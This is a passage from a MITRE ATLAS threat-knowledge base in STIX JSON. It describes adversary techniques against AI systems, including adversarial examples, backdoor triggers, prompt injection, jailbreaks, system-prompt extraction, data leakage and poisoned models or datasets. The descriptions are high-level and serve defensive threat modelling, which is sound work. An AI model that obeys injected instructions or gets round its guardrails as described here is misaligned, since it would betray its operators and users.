consumption.\nTypically, the modification is constrained in magnitude or location so that a human still perceives the data as if it were unmodified, but human perceptibility may not always be a concern depending on the adversary's intended effect.\nFor example, an adversarial input for an image classification task is an image the AI model would misclassify, but a human would still recognize as containing the correct class.\n\nDepending on the adversary's knowledge of and access to the target model, the adversary may use different classes of algorithms to develop the adversarial example such as [White-Box Optimization](/techniques/AML.T0043.000), [Black-Box Optimization](/techniques/AML.T0043.001), [Black-Box Transfer](/techniques/AML.T0043.002), or [Manual Modification](/techniques/AML.T0043.003).\n\nThe adversary may [Verify Attack](/techniques/AML.T0042) their approach works if they have white-box or inference API access to the model.\nThis allows the adversary to gain confidence their attack is effective \"live\" environment where their attack may be noticed.\nThey can then use the attack at a later time to accomplish their goals.\nAn adversary may optimize adversarial examples for [Evade AI Model](/techniques/AML.T0015), or to [Erode AI Model Integrity](/techniques/AML.T0031).", "kill_chain_phases": [{"kill_chain_name": "mitre-atlas", "phase_name": "ai-attack-staging"}], "external_references": [{"source_name": "mitre-atlas", "url": "https://atlas.mitre.org/techniques/AML.T0043", "external_id": "AML.T0043"}], "x_mitre_platforms": ["ATLAS"]}, {"type": "attack-pattern", "spec_version": "2.1", "id": "attack-pattern--5e379496-6393-41d5-b392-ba96edbe4f86", "created": "2025-08-12T19:58:34.751075Z", "modified": "2025-08-12T19:58:34.751075Z", "name": "White-Box Optimization", "description": "In White-Box Optimization, the adversary has full access to the target model and optimizes the adversarial example directly.\nAdversarial examples trained in this manner are most effective against the target model.\n", "kill_chain_phases": [{"kill_chain_name": "mitre-atlas", "phase_name": "ai-attack-staging"}], "external_references": [{"source_name": "mitre-atlas", "url": "https://atlas.mitre.org/techniques/AML.T0043.000", "external_id": "AML.T0043.000"}], "x_mitre_is_subtechnique": true, "x_mitre_platforms": ["ATLAS"]}, {"type": "attack-pattern", "spec_version": "2.1", "id": "attack-pattern--cc16b8bf-0a76-4335-b3db-969399dac525", "created": "2025-08-12T19:58:34.751215Z", "modified": "2025-08-12T19:58:34.751215Z", "name": "Black-Box Optimization", "description": "In Black-Box attacks, the adversary has black-box (i.e. [AI Model Inference API Access](/techniques/AML.T0040) via API access) access to the target model.\nWith black-box attacks, the adversary may be using an API that the victim is monitoring.\nThese attacks are generally less effective and require more inferences than [White-Box Optimization](/techniques/AML.T0043.000) attacks, but they require much less access.\n", "kill_chain_phases": [{"kill_chain_name": "mitre-atlas", "phase_name": "ai-attack-staging"}], "external_references": [{"source_name": "mitre-atlas", "url": "https://atlas.mitre.org/techniques/AML.T0043.001", "external_id": "AML.T0043.001"}], "x_mitre_is_subtechnique": true, "x_mitre_platforms": ["ATLAS"]}, {"type": "attack-pattern", "spec_version": "2.1", "id": "attack-pattern--b6fceafb-8079-4f36-b4b7-54d62832a111", "created": "2025-08-12T19:58:34.751356Z", "modified": "2025-08-12T19:58:34.751356Z", "name": "Black-Box Transfer", "description": "In Black-Box Transfer attacks, the adversary uses one or more proxy models (trained via [Create Proxy AI Model](/techniques/AML.T0005) or [Train Proxy via Replication](/techniques/AML.T0005.001)) they have full access to and are representative of the target model.\nThe adversary uses [White-Box Optimization](/techniques/AML.T0043.000) on the proxy models to generate adversarial examples.\nIf the set of proxy models are close enough to the target model, the adversarial example should generalize from one to another.\nThis means that an attack that works for the proxy models will likely then work for the target model.\nIf the adversary has [AI Model Inference API Access](/techniques/AML.T0040), they may use [Verify Attack](/techniques/AML.T0042) to confirm the attack is working and incorporate that information into their training process.\n", "kill_chain_phases": [{"kill_chain_name": "mitre-atlas", "phase_name": "ai-attack-staging"}], "external_references": [{"source_name": "mitre-atlas", "url": "https://atlas.mitre.org/techniques/AML.T0043.002", "external_id": "AML.T0043.002"}], "x_mitre_is_subtechnique": true, "x_mitre_platforms": ["ATLAS"]}, {"type": "attack-pattern", "spec_version": "2.1", "id": "attack-pattern--c53ecb95-432c-4681-a6ca-971d2da001bc", "created": "2025-08-12T19:58:34.751497Z", "modified": "2025-08-12T19:58:34.751497Z", "name": "Manual Modification", "description": "Adversaries may manually modify the input data to craft adversarial data.\nThey may use their knowledge of the target model to modify parts of the data they suspect helps the model in performing its task.\nThe adversary may use trial and error until they are able to verify they have a working adversarial input.\n", "kill_chain_phases": [{"kill_chain_name": "mitre-atlas", "phase_name": "ai-attack-staging"}], "external_references": [{"source_name": "mitre-atlas", "url": "https://atlas.mitre.org/techniques/AML.T0043.003", "external_id": "AML.T0043.003"}], "x_mitre_is_subtechnique": true, "x_mitre_platforms": ["ATLAS"]}, {"type": "attack-pattern", "spec_version": "2.1", "id": "attack-pattern--853ef456-d9ca-4383-9574-d2684ef4b231", "created": "2025-08-12T19:58:34.751638Z", "modified": "2025-08-12T19:58:34.751638Z", "name": "Insert Backdoor Trigger", "description": "The adversary may add a perceptual trigger into inference data.\nThe trigger may be imperceptible or non-obvious to humans.\nThis technique is used in conjunction with [Poison AI Model](/techniques/AML.T0018.000) and allows the adversary to produce their desired effect in the target model.\n", "kill_chain_phases": [{"kill_chain_name": "mitre-atlas", "phase_name": "ai-attack-staging"}], "external_references": [{"source_name": "mitre-atlas", "url": "https://atlas.mitre.org/techniques/AML.T0043.004", "external_id": "AML.T0043.004"}], "x_mitre_is_subtechnique": true, "x_mitre_platforms": ["ATLAS"]}, {"type": "attack-pattern", "spec_version": "2.1", "id": "attack-pattern--2f84bcd7-4291-4978-bfbd-e801ae2c501e", "created": "2025-08-12T19:58:34.751793Z", "modified": "2025-08-12T19:58:34.751793Z", "name": "External Harms", "description": "Adversaries may abuse their access to a victim system and use its resources or capabilities to further their goals by causing harms external to that system.\nThese harms could affect the organization (e.g. Financial Harm, Reputational Harm), its users (e.g. User Harm), or the general public (e.g. Societal Harm).\n", "kill_chain_phases": [{"kill_chain_name": "mitre-atlas", "phase_name": "impact"}], "external_references": [{"source_name": "mitre-atlas", "url": "https://atlas.mitre.org/techniques/AML.T0048", "external_id": "AML.T0048"}], "x_mitre_platforms": ["ATLAS"]}, {"type": "attack-pattern", "spec_version": "2.1", "id": "attack-pattern--41642416-9252-4d86-9824-396bc0f1b1a9", "created": "2025-08-12T19:58:34.751991Z", "modified": "2025-08-12T19:58:34.751991Z", "name": "Financial Harm", "description": "Financial harm involves the loss of wealth, property, or other monetary assets due to theft, fraud or forgery, or pressure to provide financial resources to the adversary.\n", "kill_chain_phases": [{"kill_chain_name": "mitre-atlas", "phase_name": "impact"}], "external_references": [{"source_name": "mitre-atlas", "url": "https://atlas.mitre.org/techniques/AML.T0048.000", "external_id": "AML.T0048.000"}], "x_mitre_is_subtechnique": true, "x_mitre_platforms": ["ATLAS"]}, {"type": "attack-pattern", "spec_version": "2.1", "id": "attack-pattern--aecd0fff-8f6c-46ec-b8f0-6f4cbd7fdc5f", "created": "2025-08-12T19:58:34.752156Z", "modified": "2025-08-12T19:58:34.752156Z", "name": "Reputational Harm", "description": "Reputational harm involves a degradation of public perception and trust in organizations.  Examples of reputation-harming incidents include scandals or false impersonations.\n", "kill_chain_phases": [{"kill_chain_name": "mitre-atlas", "phase_name": "impact"}], "external_references": [{"source_name": "mitre-atlas", "url": "https://atlas.mitre.org/techniques/AML.T0048.001", "external_id": "AML.T0048.001"}], "x_mitre_is_subtechnique": true, "x_mitre_platforms": ["ATLAS"]}, {"type": "attack-pattern", "spec_version": "2.1", "id": "attack-pattern--f28e7e61-a369-405d-b816-cee59c2d1360", "created": "2025-08-12T19:58:34.752305Z", "modified": "2025-08-12T19:58:34.752305Z", "name": "Societal Harm", "description": "Societal harms might generate harmful outcomes that reach either the general public or specific vulnerable groups such as the exposure of children to vulgar content.\n", "kill_chain_phases": [{"kill_chain_name": "mitre-atlas", "phase_name": "impact"}], "external_references": [{"source_name": "mitre-atlas", "url": "https://atlas.mitre.org/techniques/AML.T0048.002", "external_id": "AML.T0048.002"}], "x_mitre_is_subtechnique": true, "x_mitre_platforms": ["ATLAS"]}, {"type": "attack-pattern", "spec_version": "2.1", "id": "attack-pattern--3bfb06ff-bb5f-4535-95c7-f8e026e6fced", "created": "2025-08-12T19:58:34.752444Z", "modified": "2025-08-12T19:58:34.752444Z", "name": "User Harm", "description": "User harms may encompass a variety of harm types including financial and reputational that are directed at or felt by individual victims of the attack rather than at the organization level.\n", "kill_chain_phases": [{"kill_chain_name": "mitre-atlas", "phase_name": "impact"}], "external_references": [{"source_name": "mitre-atlas", "url": "https://atlas.mitre.org/techniques/AML.T0048.003", "external_id": "AML.T0048.003"}], "x_mitre_is_subtechnique": true, "x_mitre_platforms": ["ATLAS"]}, {"type": "attack-pattern", "spec_version": "2.1", "id": "attack-pattern--6849f610-5eb5-4b0d-9f88-82b2bbf3fd43", "created": "2025-08-12T19:58:34.752584Z", "modified": "2025-08-12T19:58:34.752584Z", "name": "AI Intellectual Property Theft", "description": "Adversaries may exfiltrate AI artifacts to steal intellectual property and cause economic harm to the victim organization.\n\nProprietary training data is costly to collect and annotate and may be a target for [Exfiltration](/tactics/AML.TA0010) and theft.\n\nAIaaS providers charge for use of their API.\nAn adversary who has stolen a model via [Exfiltration](/tactics/AML.TA0010) or via [Extract AI Model](/techniques/AML.T0024.002) now has unlimited use of that service without paying the owner of the intellectual property.", "kill_chain_phases": [{"kill_chain_name": "mitre-atlas", "phase_name": "impact"}], "external_references": [{"source_name": "mitre-atlas", "url": "https://atlas.mitre.org/techniques/AML.T0048.004", "external_id": "AML.T0048.004"}], "x_mitre_is_subtechnique": true, "x_mitre_platforms": ["ATLAS"]}, {"type": "attack-pattern", "spec_version": "2.1", "id": "attack-pattern--e15ad3ee-f5fa-41ae-8870-67b01755b220", "created": "2025-08-12T19:58:34.752734Z", "modified": "2025-08-12T19:58:34.752734Z", "name": "Exploit Public-Facing Application", "description": "Adversaries may attempt to take advantage of a weakness in an Internet-facing computer or program using software, data, or commands in order to cause unintended or unanticipated behavior. The weakness in the system can be a bug, a glitch, or a design vulnerability. These applications are often websites, but can include databases (like SQL), standard services (like SMB or SSH), network device administration and management protocols (like SNMP and Smart Install), and any other applications with Internet accessible open sockets, such as web servers and related services.\n", "kill_chain_phases": [{"kill_chain_name": "mitre-atlas", "phase_name": "initial-access"}], "external_references": [{"source_name": "mitre-atlas", "url": "https://atlas.mitre.org/techniques/AML.T0049", "external_id": "AML.T0049"}], "x_mitre_platforms": ["ATLAS"]}, {"type": "attack-pattern", "spec_version": "2.1", "id": "attack-pattern--02118032-70ce-43ff-881e-07e0efc94499", "created": "2025-08-12T19:58:34.752822Z", "modified": "2025-08-12T19:58:34.752822Z", "name": "Command and Scripting Interpreter", "description": "Adversaries may abuse command and script interpreters to execute commands, scripts, or binaries. These interfaces and languages provide ways of interacting with computer systems and are a common feature across many different platforms. Most systems come with some built-in command-line interface and scripting capabilities, for example, macOS and Linux distributions include some flavor of Unix Shell while Windows installations include the Windows Command Shell and PowerShell.\n\nThere are also cross-platform interpreters such as Python, as well as those commonly associated with client applications such as JavaScript and Visual Basic.\n\nAdversaries may abuse these technologies in various ways as a means of executing arbitrary commands. Commands and scripts can be embedded in Initial Access payloads delivered to victims as lure documents or as secondary payloads downloaded from an existing C2. Adversaries may also execute commands through interactive terminals/shells, as well as utilize various Remote Services in order to achieve remote Execution.\n", "kill_chain_phases": [{"kill_chain_name": "mitre-atlas", "phase_name": "execution"}], "external_references": [{"source_name": "mitre-atlas", "url": "https://atlas.mitre.org/techniques/AML.T0050", "external_id": "AML.T0050"}], "x_mitre_platforms": ["ATLAS"]}, {"type": "attack-pattern", "spec_version": "2.1", "id": "attack-pattern--e2ea36c0-8e3e-4604-8628-143213eb8276", "created": "2025-08-12T19:58:34.752908Z", "modified": "2025-08-12T19:58:34.752908Z", "name": "LLM Prompt Injection", "description": "An adversary may craft malicious prompts as inputs to an LLM that cause the LLM to act in unintended ways.\nThese \"prompt injections\" are often designed to cause the model to ignore aspects of its original instructions and follow the adversary's instructions instead.\n\nPrompt Injections can be an initial access vector to the LLM that provides the adversary with a foothold to carry out other steps in their operation.\nThey may be designed to bypass defenses in the LLM, or allow the adversary to issue privileged commands.\nThe effects of a prompt injection can persist throughout an interactive session with an LLM.\n\nMalicious prompts may be injected directly by the adversary ([Direct](/techniques/AML.T0051.000)) either to leverage the LLM to generate harmful content or to gain a foothold on the system and lead to further effects.\nPrompts may also be injected indirectly when as part of its normal operation the LLM ingests the malicious prompt from another data source ([Indirect](/techniques/AML.T0051.001)). This type of injection can be used by the adversary to a foothold on the system or to target the user of the LLM.\n", "kill_chain_phases": [{"kill_chain_name": "mitre-atlas", "phase_name": "execution"}], "external_references": [{"source_name": "mitre-atlas", "url": "https://atlas.mitre.org/techniques/AML.T0051", "external_id": "AML.T0051"}], "x_mitre_platforms": ["ATLAS"]}, {"type": "attack-pattern", "spec_version": "2.1", "id": "attack-pattern--c9ba8911-fb11-43f0-a6d1-53140ff39d2e", "created": "2025-08-12T19:58:34.752981Z", "modified": "2025-08-12T19:58:34.752981Z", "name": "Direct", "description": "An adversary may inject prompts directly as a user of the LLM. This type of injection may be used by the adversary to gain a foothold in the system or to misuse the LLM itself, as for example to generate harmful content.\n", "kill_chain_phases": [{"kill_chain_name": "mitre-atlas", "phase_name": "execution"}], "external_references": [{"source_name": "mitre-atlas", "url": "https://atlas.mitre.org/techniques/AML.T0051.000", "external_id": "AML.T0051.000"}], "x_mitre_is_subtechnique": true, "x_mitre_platforms": ["ATLAS"]}, {"type": "attack-pattern", "spec_version": "2.1", "id": "attack-pattern--da54d2c9-a64b-4e9d-b3cd-bdd1fdc03a21", "created": "2025-08-12T19:58:34.753118Z", "modified": "2025-08-12T19:58:34.753118Z", "name": "Indirect", "description": "An adversary may inject prompts indirectly via separate data channel ingested by the LLM such as include text or multimedia pulled from databases or websites.\nThese malicious prompts may be hidden or obfuscated from the user. This type of injection may be used by the adversary to gain a foothold in the system or to target an unwitting user of the system.\n", "kill_chain_phases": [{"kill_chain_name": "mitre-atlas", "phase_name": "execution"}], "external_references": [{"source_name": "mitre-atlas", "url": "https://atlas.mitre.org/techniques/AML.T0051.001", "external_id": "AML.T0051.001"}], "x_mitre_is_subtechnique": true, "x_mitre_platforms": ["ATLAS"]}, {"type": "attack-pattern", "spec_version": "2.1", "id": "attack-pattern--f17d0af8-5385-4eb4-a391-09017ac9783d", "created": "2025-08-12T19:58:34.753264Z", "modified": "2025-08-12T19:58:34.753264Z", "name": "Phishing", "description": "Adversaries may send phishing messages to gain access to victim systems. All forms of phishing are electronically delivered social engineering. Phishing can be targeted, known as spearphishing. In spearphishing, a specific individual, company, or industry will be targeted by the adversary. More generally, adversaries can conduct non-targeted phishing, such as in mass malware spam campaigns.\n\nGenerative AI, including LLMs that generate synthetic text, visual deepfakes of faces, and audio deepfakes of speech, is enabling adversaries to scale targeted phishing campaigns. LLMs can interact with users via text conversations and can be programmed with a meta prompt to phish for sensitive information. Deepfakes can be use in impersonation as an aid to phishing.\n", "kill_chain_phases": [{"kill_chain_name": "mitre-atlas", "phase_name": "initial-access"}], "external_references": [{"source_name": "mitre-atlas", "url": "https://atlas.mitre.org/techniques/AML.T0052", "external_id": "AML.T0052"}], "x_mitre_platforms": ["ATLAS"]}, {"type": "attack-pattern", "spec_version": "2.1", "id": "attack-pattern--59aaa7f2-5a54-45cd-8de4-1896ec44566b", "created": "2025-08-12T19:58:34.753341Z", "modified": "2025-08-12T19:58:34.753341Z", "name": "Spearphishing via Social Engineering LLM", "description": "Adversaries may turn LLMs into targeted social engineers.\nLLMs are capable of interacting with users via text conversations.\nThey can be instructed by an adversary to seek sensitive information from a user and act as effective social engineers.\nThey can be targeted towards particular personas defined by the adversary.\nThis allows adversaries to scale spearphishing efforts and target individuals to reveal private information such as credentials to privileged systems.\n", "kill_chain_phases": [{"kill_chain_name": "mitre-atlas", "phase_name": "initial-access"}], "external_references": [{"source_name": "mitre-atlas", "url": "https://atlas.mitre.org/techniques/AML.T0052.000", "external_id": "AML.T0052.000"}], "x_mitre_is_subtechnique": true, "x_mitre_platforms": ["ATLAS"]}, {"type": "attack-pattern", "spec_version": "2.1", "id": "attack-pattern--8ebcea3c-27d4-49d3-aee8-400a682e3bab", "created": "2025-08-12T19:58:34.753501Z", "modified": "2025-08-12T19:58:34.753501Z", "name": "LLM Plugin Compromise", "description": "Adversaries may use their access to an LLM that is part of a larger system to compromise connected plugins.\nLLMs are often connected to other services or resources via plugins to increase their capabilities.\nPlugins may include integrations with other applications, access to public or private data sources, and the ability to execute code.\n\nThis may allow adversaries to execute API calls to integrated applications or plugins, providing the adversary with increased privileges on the system.\nAdversaries may take advantage of connected data sources to retrieve sensitive information.\nThey may also use an LLM integrated with a command or script interpreter to execute arbitrary instructions.\n", "kill_chain_phases": [{"kill_chain_name": "mitre-atlas", "phase_name": "execution"}, {"kill_chain_name": "mitre-atlas", "phase_name": "privilege-escalation"}], "external_references": [{"source_name": "mitre-atlas", "url": "https://atlas.mitre.org/techniques/AML.T0053", "external_id": "AML.T0053"}], "x_mitre_platforms": ["ATLAS"]}, {"type": "attack-pattern", "spec_version": "2.1", "id": "attack-pattern--fe1b057b-ad2f-4bfc-90f1-a456e17dee9d", "created": "2025-08-12T19:58:34.753599Z", "modified": "2025-08-12T19:58:34.753599Z", "name": "LLM Jailbreak", "description": "An adversary may use a carefully crafted [LLM Prompt Injection](/techniques/AML.T0051) designed to place LLM in a state in which it will freely respond to any user input, bypassing any controls, restrictions, or guardrails placed on the LLM.\nOnce successfully jailbroken, the LLM can be used in unintended ways by the adversary.\n", "kill_chain_phases": [{"kill_chain_name": "mitre-atlas", "phase_name": "privilege-escalation"}, {"kill_chain_name": "mitre-atlas", "phase_name": "defense-evasion"}], "external_references": [{"source_name": "mitre-atlas", "url": "https://atlas.mitre.org/techniques/AML.T0054", "external_id": "AML.T0054"}], "x_mitre_platforms": ["ATLAS"]}, {"type": "attack-pattern", "spec_version": "2.1", "id": "attack-pattern--fb6e3d21-7383-49d8-9a25-1f831184a2ed", "created": "2025-08-12T19:58:34.753684Z", "modified": "2025-08-12T19:58:34.753684Z", "name": "Unsecured Credentials", "description": "Adversaries may search compromised systems to find and obtain insecurely stored credentials.\nThese credentials can be stored and/or misplaced in many locations on a system, including plaintext files (e.g. bash history), environment variables, operating system, or application-specific repositories (e.g. Credentials in Registry), or other specialized files/artifacts (e.g. private keys).\n", "kill_chain_phases": [{"kill_chain_name": "mitre-atlas", "phase_name": "credential-access"}], "external_references": [{"source_name": "mitre-atlas", "url": "https://atlas.mitre.org/techniques/AML.T0055", "external_id": "AML.T0055"}], "x_mitre_platforms": ["ATLAS"]}, {"type": "attack-pattern", "spec_version": "2.1", "id": "attack-pattern--5c7dee7b-62ca-44a4-99ca-2412459d0124", "created": "2025-08-12T19:58:34.753768Z", "modified": "2025-08-12T19:58:34.753768Z", "name": "Extract LLM System Prompt", "description": "Adversaries may attempt to extract a large language model's (LLM) system prompt. This can be done via prompt injection to induce the model to reveal its own system prompt or may be extracted from a configuration file.\n\nSystem prompts can be a portion of an AI provider's competitive advantage and are thus valuable intellectual property that may be targeted by adversaries.", "kill_chain_phases": [{"kill_chain_name": "mitre-atlas", "phase_name": "exfiltration"}], "external_references": [{"source_name": "mitre-atlas", "url": "https://atlas.mitre.org/techniques/AML.T0056", "external_id": "AML.T0056"}], "x_mitre_platforms": ["ATLAS"]}, {"type": "attack-pattern", "spec_version": "2.1", "id": "attack-pattern--2aca6880-e878-4bc2-b100-e80ce47fb4b6", "created": "2025-08-12T19:58:34.753853Z", "modified": "2025-08-12T19:58:34.753853Z", "name": "LLM Data Leakage", "description": "Adversaries may craft prompts that induce the LLM to leak sensitive information.\nThis can include private user data or proprietary information.\nThe leaked information may come from proprietary training data, data sources the LLM is connected to, or information from other users of the LLM.\n", "kill_chain_phases": [{"kill_chain_name": "mitre-atlas", "phase_name": "exfiltration"}], "external_references": [{"source_name": "mitre-atlas", "url": "https://atlas.mitre.org/techniques/AML.T0057", "external_id": "AML.T0057"}], "x_mitre_platforms": ["ATLAS"]}, {"type": "attack-pattern", "spec_version": "2.1", "id": "attack-pattern--d01827d1-93a4-4209-b465-547400300eda", "created": "2025-08-12T19:58:34.753937Z", "modified": "2025-08-12T19:58:34.753937Z", "name": "Publish Poisoned Models", "description": "Adversaries may publish a poisoned model to a public location such as a model registry or code repository. The poisoned model may be a novel model or a poisoned variant of an existing open-source model. This model may be introduced to a victim system via [AI Supply Chain Compromise](/techniques/AML.T0010).", "kill_chain_phases": [{"kill_chain_name": "mitre-atlas", "phase_name": "resource-development"}], "external_references": [{"source_name": "mitre-atlas", "url": "https://atlas.mitre.org/techniques/AML.T0058", "external_id": "AML.T0058"}], "x_mitre_platforms": ["ATLAS"]}, {"type": "attack-pattern", "spec_version": "2.1", "id": "attack-pattern--86195060-a734-45e1-b616-ab224e31e8f3", "created": "2025-08-12T19:58:34.75402Z", "modified": "2025-08-12T19:58:34.75402Z", "name": "Erode Dataset Integrity", "description": "Adversaries may poison or manipulate portions of a dataset to reduce its usefulness, reduce trust, and cause users to waste resources correcting errors.", "kill_chain_phases": [{"kill_chain_name": "mitre-atlas", "phase_name": "impact"}], "external_references": [{"source_name": "mitre-atlas", "url": "https://atlas.mitre.org/techniques/AML.T0059", "external_id": "AML.T0059"}], "x_mitre_platforms": ["ATLAS"]}, {"type": "attack-pattern", "spec_version": "2.1", "id": "attack-pattern--30fc8375-1772-43ca-a73a-0db501756852", "created": "2025-08-12T19:58:34.754094Z", "modified": "2025-08-12T19:58:34.754094Z", "name": "Malicious Package", "description": "Adversaries may develop malicious software packages that when imported by a user have a deleterious effect.\nMalicious packages may behave as expected to the user. They may be introduced via [AI Supply Chain Compromise](/techniques/AML.T0010). They may not present as obviously malicious to the user and may appear to be useful for an AI-related task.", "kill_chain_phases": [{"kill_chain_name": "mitre-atlas", "phase_name": "impact"}], "external_references": [{"source_name": "mitre-atlas", "url": "https://atlas.mitre.org/techniques/AML.T0011.001", "external_id": "AML.T0011.001"}], "x_mitre_is_subtechnique": true, "x_mitre_platforms": ["ATLAS"]}, {"type": "attack-pattern", "spec_version": "2.1", "id": "attack-pattern--03c0c81a-2840-4251-8b85-1681b21d9e5d", "created": "2025-08-12T19:58:34.754242Z", "modified": "2025-08-12T19:58:34.754242Z", "name": "Publish Hallucinated Entities", "description": "Adversaries may create an entity they control, such as a software package, website, or email address to a source hallucinated by an LLM. The hallucinations may take the form of package names commands, URLs, company names, or email addresses that point the victim to the entity controlled by the adversary. When the victim interacts with the adversary-controlled entity, the attack can proceed.", "kill_chain_phases": [{"kill_chain_name": "mitre-atlas", "phase_name": "resource-development"}], "external_references": [{"source_name": "mitre-atlas", "url": "https://atlas.mitre.org/techniques/AML.T0060", "external_id": "AML.T0060"}], "x_mitre_platforms": ["ATLAS"]}, {"type": "attack-pattern", "spec_version": "2.1", "id": "attack-pattern--cfd9296e-981f-4be4-a3ce-04521676ca0e", "created": "2025-08-12T19:58:34.75433Z", "modified": "2025-08-12T19:58:34.75433Z", "name": "LLM Prompt Self-Replication", "description": "An adversary may use a carefully crafted [LLM Prompt Injection](/techniques/AML.T0051) designed to cause the LLM to replicate the prompt as part of its output. This allows the prompt to propagate to other LLMs and persist on the system. The self-replicating prompt is typically paired with other malicious instructions (ex: [LLM Jailbreak](/techniques/AML.T0054), [LLM Data Leakage](/techniques/AML.T0057)).", "kill_chain_phases": [{"kill_chain_name": "mitre-atlas", "phase_name": "persistence"}], "external_references": [{"source_name": "mitre-atlas", "url": "https://atlas.mitre.org/techniques/AML.T0061", "external_id": "AML.T0061"}], "x_mitre_platforms": ["ATLAS"]}, {"type": "attack-pattern", "spec_version": "2.1", "id": "attack-pattern--ab989163-432c-4466-aad8-4d0b0c4f2051", "created": "2025-08-12T19:58:34.754415Z", "modified": "2025-08-12T19:58:34.754415Z", "name": "Discover LLM Hallucinations", "description": "Adversaries may prompt large language models and identify hallucinated entities.\nThey may request software packages, commands, URLs, organization names, or e-mail addresses, and identify hallucinations with no connected real-world source. Discovered hallucinations provide the adversary with potential targets to [Publish Hallucinated Entities](/techniques/AML.T0060). Different LLMs have been shown to produce the same hallucinations, so the hallucinations exploited by an adversary may affect users of other LLMs.", "kill_chain_phases": [{"kill_chain_name": "mitre-atlas", "phase_name": "discovery"}], "external_references": [{"source_name": "mitre-atlas", "url": "https://atlas.mitre.org/techniques/AML.T0062", "external_id": "AML.T0062"}], "x_mitre_platforms": ["ATLAS"]}, {"type": "attack-pattern", "spec_version": "2.1", "id": "attack-pattern--374f1fa9-3abc-4b58-8bc5-ceb10c3c0a2b", "created": "2025-08-12T19:58:34.754491Z", "modified": "2025-08-12T19:58:34.754491Z", "name": "Domains", "description": "Adversaries may acquire domains that can be used during targeting. Domain names are the human readable names used to represent one or more IP addresses. They can be purchased or, in some cases, acquired for free.\n\nAdversaries may use acquired domains for a variety of purposes (see [ATT&CK](https://attack.mitre.org/techniques/T1583/001/)). Large AI datasets are often distributed as a list of URLs to individual datapoints. Adversaries may acquire expired domains that are included in these datasets and replace individual datapoints with poisoned examples ([Publish Poisoned Datasets](/techniques/AML.T0019)).", "kill_chain_phases": [{"kill_chain_name": "mitre-atlas", "phase_name": "discovery"}], "external_references": [{"source_name": "mitre-atlas", "url": "https://atlas.mitre.org/techniques/AML.T0008.002", "external_id": "AML.T0008.002"}], "x_mitre_is_subtechnique": true, "x_mitre_platforms": ["ATLAS"]}, {"type": "attack-pattern", "spec_version": "2.1", "id": "attack-pattern--056a22ff-1355-44e0-8ee8-7139341188ab", "created": "2025-08-12T19:58:34.754628Z", "modified": "2025-08-12T19:58:34.754628Z", "name": "Physical Countermeasures", "description": "Adversaries may acquire or manufacture physical countermeasures to aid or support their attack.\n\nThese components may be used to disrupt or degrade the model, such as adversarial patterns printed on stickers or T-shirts, disguises, or decoys. They may also be used to disrupt or degrade the sensors used in capturing data, such as laser pointers, light bulbs, or other tools.", "kill_chain_phases": [{"kill_chain_name": "mitre-atlas", "phase_name": "discovery"}], "external_references": [{"source_name": "mitre-atlas", "url": "https://atlas.mitre.org/techniques/AML.T0008.003", "external_id": "AML.T0008.003"}], "x_mitre_is_subtechnique": true, "x_mitre_platforms": ["ATLAS"]}, {"type": "attack-pattern", "spec_version": "2.1", "id": "attack-pattern--222e7ac0-82fe-4570-a5cb-6794a2b93335", "created": "2025-08-12T19:58:34.754778Z", "modified": "2025-08-12T19:58:34.754778Z", "name": "Discover AI Model Outputs", "description": "Adversaries may discover model outputs, such as class scores, whose presence is not required for the system to function and are not intended for use by the end user. Model outputs may be found in logs or may be included in API responses.\nModel outputs may enable the adversary to identify weaknesses in the model and develop attacks.", "kill_chain_phases": [{"kill_chain_name": "mitre-atlas", "phase_name": "discovery"}], "external_references": [{"source_name": "mitre-atlas", "url": "https://atlas.mitre.org/techniques/AML.T0063", "external_id": "AML.T0063"}], "x_mitre_platforms": ["ATLAS"]}, {"type": "attack-pattern", "spec_version": "2.1", "id": "attack-pattern--869faa3d-21e5-436b-8839-8ede09909285", "created": "2025-08-12T19:58:34.754856Z", "modified": "2025-08-12T19:58:34.754856Z", "name": "Generative AI", "description": "Adversaries may search for and obtain generative AI models or tools, such as large language models (LLMs), to assist them in various steps of their operation. Generative AI can be used in a variety of malicious ways, including generating malware or offensive cyber scripts, [Retrieval Content Crafting](/techniques/AML.T0066), or generating [Phishing](/techniques/AML.T0052) content.\n\nAdversaries may obtain an open source model or they may leverage a generative AI service. They may need to jailbreak the generative AI model to bypass any restrictions put in place to limit the types of responses it can generate. They may also need to break the terms of service of the generative AI.", "kill_chain_phases": [{"kill_chain_name": "mitre-atlas", "phase_name": "discovery"}], "external_references": [{"source_name": "mitre-atlas", "url": "https://atlas.mitre.org/techniques/AML.T0016.002", "external_id": "AML.T0016.002"}], "x_mitre_is_subtechnique": true, "x_mitre_platforms": ["ATLAS"]}, {"type": "attack-pattern", "spec_version": "2.1", "id": "attack-pattern--569d2697-1cc4-406e-8eee-050d2c208ef9", "created": "2025-08-12T19:58:34.755011Z", "modified": "2025-08-12T19:58:34.755011Z", "name": "Gather RAG-Indexed Targets", "description": "Adversaries may identify data sources used in retrieval augmented generation (RAG) systems for targeting purposes. By pinpointing these sources, attackers can focus on poisoning or otherwise manipulating the external data repositories the AI relies on.\n\nRAG-indexed data may be identified in public documentation about the system, or by interacting with the system directly and observing any indications of or references to external data sources.", "kill_chain_phases": [{"kill_chain_name": "mitre-atlas", "phase_name": "reconnaissance"}], "external_references": [{"source_name": "mitre-atlas", "url": "https://atlas.mitre.org/techniques/AML.T0064", "external_id": "AML.T0064"}], "x_mitre_platforms": ["ATLAS"]}, {"type": "attack-pattern", "spec_version": "2.1", "id": "attack-pattern--b3f203c7-1204-431d-b4d1-8bc1a04c6bf5", "created": "2025-08-12T19:58:34.755099Z", "modified": "2025-08-12T19:58:34.755099Z", "name": "LLM Prompt Crafting", "description": "Adversaries may use their acquired knowledge of the target generative AI system to craft prompts that bypass its defenses and allow malicious instructions to be executed.\n\nThe adversary may iterate on the prompt to ensure that it works as-intended consistently.", "kill_chain_phases": [{"kill_chain_name": "mitre-atlas", "phase_name": "resource-development"}], "external_references": [{"source_name": "mitre-atlas", "url": "https://atlas.mitre.org/techniques/AML.T0065", "external_id": "AML.T0065"}], "x_mitre_platforms": ["ATLAS"]}, {"type": "attack-pattern", "spec_version": "2.1", "id": "attack-pattern--978fa602-2719-4836-a0af-ce67adebf21e", "created": "2025-08-12T19:58:34.755186Z", "modified": "2025-08-12T19:58:34.755186Z", "name": "Retrieval Content Crafting", "description": "Adversaries may write content designed to be retrieved by user queries and influence a user of the system in some way. This abuses the trust the user has in the system.\n\nThe crafted content can be combined with a prompt injection. It can also stand alone in a separate document or email. The adversary must get the crafted content into the victim\\u0027s database, such as a vector database used in a retrieval augmented generation (RAG) system. This may be accomplished via cyber access, or by abusing the ingestion 